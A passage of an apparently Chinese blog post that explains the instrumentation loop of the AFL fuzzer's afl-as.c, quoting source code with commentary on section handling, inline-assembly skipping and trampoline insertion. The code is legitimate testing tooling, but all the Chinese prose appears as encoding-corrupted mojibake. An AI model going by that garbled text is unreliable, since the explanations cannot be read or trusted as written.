class="line"></span><br><span class="line">        <span class="comment">/* .L0: or LBB0_0: style jump destination */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Apple: .L&lt;num&gt; / .LBB&lt;num&gt; */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">isdigit</span>(line[<span class="number">2</span>]) || (clang_mode &amp;&amp; !<span class="built_in">strncmp</span>(line + <span class="number">1</span>, <span class="string">&quot;LBB&quot;</span>, <span class="number">3</span>)))</span><br><span class="line">            &amp;&amp; R(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* An optimization is possible here by adding the code only if the</span></span><br><span class="line"><span class="comment">             label is mentioned in the code in contexts other than call / jmp.</span></span><br><span class="line"><span class="comment">             That said, this complicates the code by requiring two-pass</span></span><br><span class="line"><span class="comment">             processing (messy with stdin), and results in a speed gain</span></span><br><span class="line"><span class="comment">             typically under 10%, because compilers are generally pretty good</span></span><br><span class="line"><span class="comment">             about not generating spurious intra-function jumps.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">             We use deferred output chiefly to avoid disrupting</span></span><br><span class="line"><span class="comment">             .Lfunc_begin0-style exception handling calculations (a problem on</span></span><br><span class="line"><span class="comment">             MacOS X). */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!skip_next_label) instrument_next = <span class="number">1</span>; <span class="keyword">else</span> skip_next_label = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Function label (always instrumented, deferred mode). */</span></span><br><span class="line"></span><br><span class="line">        instrument_next = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ins_lines)</span><br><span class="line">    <span class="built_in">fputs</span>(use_64bit ? main_payload_64 : main_payload_32, outf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (input_file) fclose(inf);</span><br><span class="line">  fclose(outf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!be_quiet) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ins_lines) WARNF(<span class="string">&quot;No instrumentation targets found%s.&quot;</span>,</span><br><span class="line">                          pass_thru ? <span class="string">&quot; (pass-thru mode)&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> OKF(<span class="string">&quot;Instrumented %u locations (%s-bit, %s mode, ratio %u%%).&quot;</span>,</span><br><span class="line">             ins_lines, use_64bit ? <span class="string">&quot;64&quot;</span> : <span class="string">&quot;32&quot;</span>,</span><br><span class="line">             getenv(<span class="string">&quot;AFL_HARDEN&quot;</span>) ? <span class="string">&quot;hardened&quot;</span> : </span><br><span class="line">             (sanitizer ? <span class="string">&quot;ASAN/MSAN&quot;</span> : <span class="string">&quot;non-hardened&quot;</span>),</span><br><span class="line">             inst_ratio);</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (input_file) &#123;</span><br><span class="line">    inf = <span class="built_in">fopen</span>(input_file, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!inf) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to read &#x27;%s&#x27;&quot;</span>, input_file);</span><br><span class="line">&#125; <span class="keyword">else</span> inf = stdin;</span><br><span class="line"></span><br><span class="line">outfd = <span class="built_in">open</span>(modified_file, O_WRONLY | O_EXCL | O_CREAT, <span class="number">0600</span>);</span><br><span class="line"><span class="keyword">if</span> (outfd &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to write to &#x27;%s&#x27;&quot;</span>, modified_file);</span><br><span class="line">outf = <span class="built_in">fdopen</span>(outfd, <span class="string">&quot;w&quot;</span>);</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶æ‰“å¼€å’Œåˆå§‹åŒ–</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="built_in">fgets</span>(line, MAX_LINE, inf)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;</span><br><span class="line">    instrument_next &amp;&amp; line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; <span class="built_in">isalpha</span>(line[<span class="number">1</span>])) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">          <span class="built_in">R</span>(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">  instrument_next = <span class="number">0</span>;</span><br><span class="line">  ins_lines++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fputs</span>(line, outf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pass_thru) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; line[<span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!clang_mode &amp;&amp; instr_ok &amp;&amp; !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;p2align &quot;</span>, <span class="number">8</span>) &amp;&amp;</span><br><span class="line">      <span class="built_in">isdigit</span>(line[<span class="number">10</span>]) &amp;&amp; line[<span class="number">11</span>] == <span class="string">&#x27;\n&#x27;</span>) skip_next_label = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;text\n&quot;</span>, <span class="number">5</span>) ||</span><br><span class="line">      !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t.text&quot;</span>, <span class="number">13</span>) ||</span><br><span class="line">      !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t__TEXT,__text&quot;</span>, <span class="number">21</span>) ||</span><br><span class="line">      !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section __TEXT,__text&quot;</span>, <span class="number">21</span>)) &#123;</span><br><span class="line">    instr_ok = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">continue</span>; </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t&quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">      !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section &quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">      !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;bss\n&quot;</span>, <span class="number">4</span>) ||</span><br><span class="line">      !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;data\n&quot;</span>, <span class="number">5</span>)) &#123;</span><br><span class="line">    instr_ok = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code32&quot;</span>)) skip_csect = use_64bit;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code64&quot;</span>)) skip_csect = !use_64bit;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.intel_syntax&quot;</span>)) skip_intel = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.att_syntax&quot;</span>)) skip_intel = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">1</span>] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#APP&quot;</span>)) skip_app = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#NO_APP&quot;</span>)) skip_app = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (skip_intel || skip_app || skip_csect || !instr_ok ||</span><br><span class="line">    line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">0</span>] == <span class="string">&#x27; &#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conditional branch instruction (jnz, etc). We append the instrumentation</span></span><br><span class="line"><span class="comment">   right after the branch (to instrument the not-taken path) and at the</span></span><br><span class="line"><span class="comment">   branch destination label (handled later on). */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (line[<span class="number">1</span>] == <span class="string">&#x27;j&#x27;</span> &amp;&amp; line[<span class="number">2</span>] != <span class="string">&#x27;m&#x27;</span> &amp;&amp; <span class="built_in">R</span>(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">            <span class="built_in">R</span>(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">    ins_lines++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯å»¶è¿Ÿæ’æ¡©çš„æœºåˆ¶ï¼Œ<code>fgets</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°<code>line</code>è¢«å®šä¹‰ä¸º<code>static u8 line[MAX_LINE];</code>ï¼Œå®<code>MAX_LINE</code>åœ¨<code>config.h</code>ä¸­è¢«é»˜è®¤å®šä¹‰ä¸º8192ã€‚å°†<code>line</code>å±•å¼€ï¼Œå¯ä»¥å¾—åˆ°<code>static uint8_t line[8192]</code>ï¼Œä¹Ÿå°±æ˜¯è¯´<code>fgets</code>å‡½æ•°ä¼šè¯»å–<code>input_file</code>çš„ä¸€è¡Œä»£ç å­˜æ”¾åˆ°<code>line</code>æ•°ç»„ï¼ˆæœ€å¤šè¯»å–<code>MAX_LINE</code>ä¸ªå­—ç¬¦ï¼‰ï¼š<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202507282100739.png" alt="image-20250728201118243"></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202507282100740.png" alt="image-20250728201145951"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;</span><br><span class="line">    instrument_next &amp;&amp; line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; <span class="built_in">isalpha</span>(line[<span class="number">1</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">            <span class="built_in">R</span>(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">    instrument_next = <span class="number">0</span>;</span><br><span class="line">    ins_lines++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§¦å‘æ¡ä»¶ï¼š</p><ol><li>ä¸åœ¨ç›´é€šæ¨¡å¼ <code>(!pass_thru)</code></li><li>ä¸è·³è¿‡Intelè¯­æ³• <code>(!skip_intel)</code></li><li>ä¸è·³è¿‡å†…è”æ±‡ç¼– <code>(!skip_app)</code></li><li>ä¸è·³è¿‡ä»£ç æ®µ <code>(!skip_csect)</code></li><li>åœ¨å¯æ’æ¡©åŒºåŸŸ <code>(instr_ok)</code></li><li>æ ‡è®°éœ€è¦æ’æ¡© <code>(instrument_next)</code></li><li>å½“å‰è¡Œæ˜¯æŒ‡ä»¤ <code>(line[0] == &#39;\t&#39; &amp;&amp; isalpha(line[1]))</code></li></ol><p>å¦‚æœæ»¡è¶³ä»¥ä¸Šæ‰€æœ‰æ¡ä»¶ï¼Œå°±ä¼šç›´æ¥å°†æ’æ¡©ä»£ç å†™å…¥<code>outf</code>å˜é‡ï¼Œç„¶åå†é€šè¿‡<code>fputs</code>å‡½æ•°å†™å…¥å¯¹åº”æ–‡ä»¶ä¸­</p><p>å¦‚æœæ˜¯ç›´é€šæ¨¡å¼å°±ä¼šç›´æ¥å°†æ±‡ç¼–å†™å…¥è¿›å…¥ä¸‹ä¸€è¡Œäº†</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fputs</span>(line, outf);</span><br><span class="line"><span class="keyword">if</span> (pass_thru) <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; line[<span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// æ£€æµ‹.textæ®µ</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;text\n&quot;</span>, <span class="number">5</span>) ||</span><br><span class="line">        !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t.text&quot;</span>, <span class="number">13</span>) ||</span><br><span class="line">        !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t__TEXT,__text&quot;</span>, <span class="number">21</span>) ||</span><br><span class="line">        !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section __TEXT,__text&quot;</span>, <span class="number">21</span>)) &#123;</span><br><span class="line">        instr_ok = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">continue</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æµ‹å…¶ä»–æ®µ</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t&quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">        !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section &quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">        !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;bss\n&quot;</span>, <span class="number">4</span>) ||</span><br><span class="line">        !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;data\n&quot;</span>, <span class="number">5</span>)) &#123;</span><br><span class="line">        instr_ok = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ®µç±»å‹å¤„ç†ï¼š</p><table><thead><tr><th align="left">æ®µç±»å‹</th><th align="left">æ’æ¡©çŠ¶æ€</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">.text</td><td align="left">å¯ç”¨</td><td align="left">ä»£ç æ®µï¼Œä¸»è¦æ’æ¡©ç›®æ ‡</td></tr><tr><td align="left">__TEXT,__text</td><td align="left">å¯ç”¨</td><td align="left">macOSä»£ç æ®µ</td></tr><tr><td align="left">.bss</td><td align="left">ç¦ç”¨</td><td align="left">æœªåˆå§‹åŒ–æ•°æ®æ®µ</td></tr><tr><td align="left">.data</td><td align="left">ç¦ç”¨</td><td align="left">å·²åˆå§‹åŒ–æ•°æ®æ®µ</td></tr><tr><td align="left">å…¶ä»– .section</td><td align="left">ç¦ç”¨</td><td align="left">å…¶ä»–ç‰¹æ®Šæ®µ</td></tr></tbody></table><p>å‡è®¾å½“å‰æ˜¯<code>.text</code>æ®µï¼Œé‚£ä¹ˆä¼šæ ‡è®°<code>instr_ok=1</code>ï¼Œè¯´æ˜å½“å‰æ®µæ˜¯å¯ä»¥æ’æ¡©çš„ä»£ç ï¼Œé‚£ä¹ˆ<code>continue</code>ä¹‹åï¼Œæ¥ä¸‹æ¥çš„ç‰‡æ®µå°±æ˜¯<code>.text</code>æ®µå³ä»£ç æ®µçš„å†…å®¹äº†ï¼Œå°±å¯ä»¥è¿›è¡Œæ’æ¡©äº†</p><p>æ¥ä¸‹æ¥å°±æ˜¯ç‰¹æ®Šæƒ…å†µçš„å¤„ç†ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!clang_mode &amp;&amp; instr_ok &amp;&amp; !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;p2align &quot;</span>, <span class="number">8</span>) &amp;&amp;</span><br><span class="line">    <span class="built_in">isdigit</span>(line[<span class="number">10</span>]) &amp;&amp; line[<span class="number">11</span>] == <span class="string">&#x27;\n&#x27;</span>) skip_next_label = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>OpenBSDçš„ç‰¹æ®Šæ€§ï¼š</p><ul><li><p>OpenBSD å°†è·³è½¬è¡¨ï¼ˆjump tablesï¼‰ç›´æ¥å†…è”åœ¨ä»£ç ä¸­</p></li><li><p>è·³è½¬è¡¨æ˜¯ç¼–è¯‘å™¨ç”Ÿæˆçš„ç”¨äº switch è¯­å¥ä¼˜åŒ–çš„æ•°æ®ç»“æ„</p></li><li><p>è¿™äº›è¡¨è¢«æ”¾åœ¨ .text æ®µä¸­ï¼Œä½†ä¸åº”è¯¥è¢«å½“ä½œæ™®é€šä»£ç æ’æ¡©</p></li></ul><p>ä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">.p2align 4              # â† è¿™é‡Œä¼šè¢«æ£€æµ‹åˆ°</span><br><span class="line">.L_jump_table:          # â† è¿™ä¸ªæ ‡ç­¾ä¼šè¢«è·³è¿‡æ’æ¡©</span><br><span class="line">    .quad .L1</span><br><span class="line">    .quad .L2</span><br><span class="line">    .quad .L3</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸è¿›è¡Œç‰¹æ®Šå¤„ç†ï¼Œä¼šå‡ºç°ä»¥ä¸‹æƒ…å†µï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é”™è¯¯çš„æ’æ¡©ï¼ˆå¦‚æœä¸ç‰¹æ®Šå¤„ç†ï¼‰</span></span><br><span class="line">.p2align <span class="number">4</span></span><br><span class="line"><span class="comment">/* AFLæ’æ¡©ä»£ç  */</span>    # â† è¿™ä¼šç ´åè·³è½¬è¡¨çš„å¯¹é½</span><br><span class="line">.L_jump_table:</span><br><span class="line">    .quad .L1</span><br></pre></td></tr></table></figure><p>ä¼šç ´åp2alignæŒ‡ä»¤çš„å¯¹é½æ•ˆæœï¼›è·³è½¬è¡¨æ˜¯æ•°æ®ï¼Œä¸æ˜¯ä»£ç ï¼Œä¸åº”è¯¥è¢«æ’æ¡©ï¼›é”™è¯¯çš„æ’æ¡©ä¼šå¯¼è‡´è·³è½¬è¡¨å¯»å€é”™è¯¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (strstr(line, &quot;.code&quot;)) &#123;</span><br><span class="line">    if (strstr(line, &quot;.code32&quot;)) skip_csect = use_64bit;</span><br><span class="line">    if (strstr(line, &quot;.code64&quot;)) skip_csect = !use_64bit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ··åˆæ¶æ„ä»£ç ï¼š</p><ul><li><p>åŒä¸€ä¸ªæ±‡ç¼–æ–‡ä»¶å¯èƒ½åŒ…å«32ä½å’Œ64ä½ä»£ç æ®µï¼ˆæ¯”å¦‚armv8å‘å‰å…¼å®¹ï¼‰</p></li><li><p>åœ¨è°ƒè¯•å™¨ï¼ˆå¦‚GDBï¼‰ä¸­ç»å¸¸é‡åˆ°</p></li><li><p>éœ€è¦æ ¹æ®å½“å‰ç¼–è¯‘ç›®æ ‡è·³è¿‡ä¸åŒ¹é…çš„ä»£ç æ®µ</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.intel_syntax&quot;</span>)) skip_intel = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.att_syntax&quot;</span>)) skip_intel = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>ç”±äºgccæœ¬èº«é»˜è®¤ä½¿ç”¨AT&amp;Tè¯­æ³•ï¼ŒAFLçš„æ’æ¡©ä»£ç ä¹Ÿæ˜¯ç”¨AT&amp;Tè¯­æ³•å†™çš„</p><blockquote><p>æˆ–è®¸æˆ‘å¯ä»¥å†™ä¸€ä¸ªpatchæ¥å…¼å®¹è¿™éƒ¨åˆ†ï¼ˆï¼‰</p></blockquote><p>ä¾‹å­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">    movl %eax, %ebx     # AT&amp;Tè¯­æ³•ï¼Œæ­£å¸¸æ’æ¡©</span><br><span class="line"></span><br><span class="line">.intel_syntax noprefix  # â† æ£€æµ‹åˆ°Intelè¯­æ³•</span><br><span class="line">    mov ebx, eax        # Intelè¯­æ³•ï¼Œè·³è¿‡æ’æ¡©</span><br><span class="line">    jnz label1          # è·³è¿‡æ’æ¡©</span><br><span class="line"></span><br><span class="line">.att_syntax prefix      # â† æ£€æµ‹åˆ°AT&amp;Tè¯­æ³•</span><br><span class="line">    movl %eax, %ebx     # æ¢å¤æ’æ¡©</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">1</span>] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#APP&quot;</span>)) skip_app = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#NO_APP&quot;</span>)) skip_app = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†…è”æ±‡ç¼–ä¸€èˆ¬éƒ½æ˜¯</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">main:</span><br><span class="line">    # æ™®é€šCä»£ç ç”Ÿæˆçš„æ±‡ç¼–</span><br><span class="line">    pushq %rbp</span><br><span class="line">    </span><br><span class="line">#APP                    # â† å†…è”æ±‡ç¼–å¼€å§‹æ ‡è®°</span><br><span class="line">    movl $<span class="number">42</span>, %eax      # ç”¨æˆ·æ‰‹å†™çš„æ±‡ç¼–</span><br><span class="line">#NO_APP                 # â† å†…è”æ±‡ç¼–ç»“æŸæ ‡è®°</span><br><span class="line">    </span><br><span class="line">    # ç»§ç»­æ™®é€šæ±‡ç¼–</span><br><span class="line">    popq %rbp</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>å› ä¸ºå†…è”æ±‡ç¼–ä¸€èˆ¬éƒ½æ˜¯ç¨‹åºå‘˜æ‰‹å†™çš„ï¼Œä¸ç¬¦åˆç¼–è¯‘å™¨ç”Ÿæˆä»£ç çš„æ¨¡å¼ï¼›åŒæ—¶<code>#</code>è¿˜æ£€æµ‹äº†æ³¨é‡Š</p><p>æ¥ä¸‹æ¥å°±æ˜¯ä¸€ä¸ªæµç¨‹å›¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">å¼€å§‹</span><br><span class="line">  â†“</span><br><span class="line">æ‰“å¼€è¾“å…¥/è¾“å‡ºæ–‡ä»¶</span><br><span class="line">  â†“</span><br><span class="line">é€è¡Œè¯»å–æ±‡ç¼–ä»£ç </span><br><span class="line">  